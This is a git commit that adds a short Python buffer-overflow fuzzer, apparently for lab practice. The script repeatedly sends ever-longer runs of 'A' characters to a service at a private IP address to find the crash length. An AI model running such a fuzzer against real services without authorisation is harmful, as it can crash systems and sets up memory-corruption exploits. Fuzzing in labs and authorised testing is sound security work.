54eb3c688f39d5b64646cca46afe0c36abc4ad6c
autom4il <109908737+autom4il@users.noreply.github.com>
2022-12-25 12:26:54 +0100

    Create bof-fuzzer.py

---
+++ bof-fuzzer.py
@@ -0,0 +1,22 @@
+#!/usr/bin/env python
+
+import sys
+import socket
+import time
+
+data = "A" * 500
+max_input = 3300
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("192.168.171.10", 2233))
+
+try:
+    while len(data) <= max_input:
+        increment = "A" * 500
+        print("[+] Fuzzing with " + str(len(data)))
+        s.send(data.encode())
+        time.sleep(0.1)
+        data += increment
+except BrokenPipeError:
+    print("[!] Closing connection!")
+    sys.exit()
